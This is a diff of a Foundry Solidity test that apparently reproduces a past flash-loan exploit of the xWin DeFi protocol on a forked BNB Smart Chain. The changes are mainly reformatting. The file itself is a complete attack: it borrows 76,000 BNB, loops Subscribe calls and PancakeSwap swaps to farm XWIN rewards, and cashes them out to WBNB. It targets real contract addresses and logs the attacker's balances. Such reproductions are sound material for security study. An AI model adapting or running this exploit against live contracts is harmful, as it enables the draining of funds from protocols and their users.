@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20Metadata as IERC20} from "OpenZeppelin/interfaces/IERC20Metadata.sol";
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 
 import {IPancakePair} from "src/interfaces/IPancakePair.sol";
 import {IWETH} from "src/interfaces/IWETH.sol";
@@ -26,21 +26,21 @@ struct TradeParams {
 }
 
 interface IBank {
-
-    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;
-
+    function flashloan(
+        address receiver,
+        address token,
+        uint256 amount,
+        bytes memory params
+    ) external;
 }
 
 interface IxWinDefi {
-
     function Subscribe(TradeParams memory _tradeParams) external payable;
     function Redeem(TradeParams memory _tradeParams) external payable;
     function WithdrawReward() external payable;
-
 }
 
 contract SimpleAccount {
-
     IxWinDefi xWinDefi = IxWinDefi(0x1Bf7fe7568211ecfF68B6bC7CCAd31eCd8fe8092);
 
     IERC20 PCLPXWIN = IERC20(0x8f52e0C41164169818C1FB04B263FDC7c1e56088);
@@ -74,22 +74,23 @@ contract SimpleAccount {
         xWinDefi.WithdrawReward();
         XWIN.transfer(address(owner), XWIN.balanceOf(address(this)));
     }
-
 }
 
 contract XWinExpTest is Test {
-
     IBank bank = IBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);
     IxWinDefi xWinDefi = IxWinDefi(0x1Bf7fe7568211ecfF68B6bC7CCAd31eCd8fe8092);
 
-    IPancakePair xwinwbnbpair = IPancakePair(0x2D74b7DbF2835aCadd8d4eF75B841c01E1a68383);
-    IPancakePair xwinwbnbpair2 = IPancakePair(0xD4A3Dcf47887636B19eD1b54AAb722Bd620e5fb4);
+    IPancakePair xwinwbnbpair =
+        IPancakePair(0x2D74b7DbF2835aCadd8d4eF75B841c01E1a68383);
+    IPancakePair xwinwbnbpair2 =
+        IPancakePair(0xD4A3Dcf47887636B19eD1b54AAb722Bd620e5fb4);
 
     IERC20 XWIN = IERC20(0xd88ca08d8eec1E9E09562213Ae83A7853ebB5d28);
     IWETH WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 PCLPXWIN = IERC20(0x8f52e0C41164169818C1FB04B263FDC7c1e56088);
 
-    address payable private repayAddr = payable(0xc78248D676DeBB4597e88071D3d889eCA70E5469);
+    address payable private repayAddr =
+        payable(0xc78248D676DeBB4597e88071D3d889eCA70E5469);
 
     function setUp() public {
         vm.createSelectFork("bsc", 8_589_725);
@@ -97,18 +98,35 @@ contract XWinExpTest is Test {
     }
 
     function testExploit() external {
-        bank.flashloan(address(this), 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB, 76_000_000_000_000_000_000_000, "");
-        emit log_named_decimal_uint("Attacker BNB balance after exploit", address(this).balance, 18);
+        bank.flashloan(
+            address(this),
+            0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB,
+            76_000_000_000_000_000_000_000,
+            ""
+        );
+        emit log_named_decimal_uint(
+            "Attacker BNB balance after exploit",
+            address(this).balance,
+            18
+        );
     }
 
-    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata params
+    ) external {
         token;
         amount;
         fee;
         params;
-        require(address(this).balance == 76_000_000_000_000_000_000_000, "error");
+        require(
+            address(this).balance == 76_000_000_000_000_000_000_000,
+            "error"
+        );
         SimpleAccount account1 = new SimpleAccount();
-        (bool success,) = payable(address(account1)).call{value: 11}("");
+        (bool success, ) = payable(address(account1)).call{value: 11}("");
         success;
         account1.subscribe();
         for (uint256 i = 0; i < 20; i++) {
@@ -123,7 +141,8 @@ contract XWinExpTest is Test {
             });
             xWinDefi.Subscribe{value: bnbbalance}(tradeParams);
 
-            (uint112 reserve0a, uint112 reserve1a,) = xwinwbnbpair.getReserves();
+            (uint112 reserve0a, uint112 reserve1a, ) = xwinwbnbpair
+                .getReserves();
             uint256 xwinbalance = XWIN.balanceOf(address(this));
             uint256 wbnbout = getAmountOut(xwinbalance, reserve1a, reserve0a);
             XWIN.transfer(address(xwinwbnbpair), xwinbalance);
@@ -140,10 +159,12 @@ contract XWinExpTest is Test {
 
         account1.withdrawRewards();
         emit log_named_decimal_uint(
-            "Attacker XWIN balance after exploit", XWIN.balanceOf(address(this)), XWIN.decimals()
+            "Attacker XWIN balance after exploit",
+            XWIN.balanceOf(address(this)),
+            XWIN.decimals()
         );
         uint256 xwinbalance1 = XWIN.balanceOf(address(this));
-        (uint112 reserve0, uint112 reserve1,) = xwinwbnbpair2.getReserves();
+        (uint112 reserve0, uint112 reserve1, ) = xwinwbnbpair2.getReserves();
         uint256 wbnbout1 = getAmountOut(xwinbalance1, reserve1, reserve0);
         XWIN.transfer(address(xwinwbnbpair2), xwinbalance1);
         xwinwbnbpair2.swap(wbnbout1, 0, address(this), "");
@@ -151,13 +172,14 @@ contract XWinExpTest is Test {
         require(WBNB.balanceOf(address(this)) > fee, "must great than fee");
         WBNB.withdraw(WBNB.balanceOf(address(this)));
 
-        (bool sucess,) = payable(repayAddr).call{value: amount + fee}("");
+        (bool sucess, ) = payable(repayAddr).call{value: amount + fee}("");
         sucess;
     }
 
     function redeem() public payable {
         PCLPXWIN.approve(
-            address(xWinDefi), 1_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000
+            address(xWinDefi),
+            1_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000
         );
         uint256 pclpxwinbalance = PCLPXWIN.balanceOf(address(this));
         TradeParams memory tradeParams = TradeParams({
@@ -174,17 +196,19 @@ contract XWinExpTest is Test {
     receive() external payable {}
     // fallback() external payable {}
 
-    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
-        internal
-        pure
-        returns (uint256 amountOut)
-    {
+    function getAmountOut(
+        uint256 amountIn,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) internal pure returns (uint256 amountOut) {
         require(amountIn > 0, "PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT");
-        require(reserveIn > 0 && reserveOut > 0, "PancakeLibrary: INSUFFICIENT_LIQUIDITY");
+        require(
+            reserveIn > 0 && reserveOut > 0,
+            "PancakeLibrary: INSUFFICIENT_LIQUIDITY"
+        );
         uint256 amountInWithFee = amountIn * (10_000 - 25);
         uint256 numerator = amountInWithFee * reserveOut;
         uint256 denominator = reserveIn * 10_000 + amountInWithFee;
         amountOut = numerator / denominator;
     }
-
 }
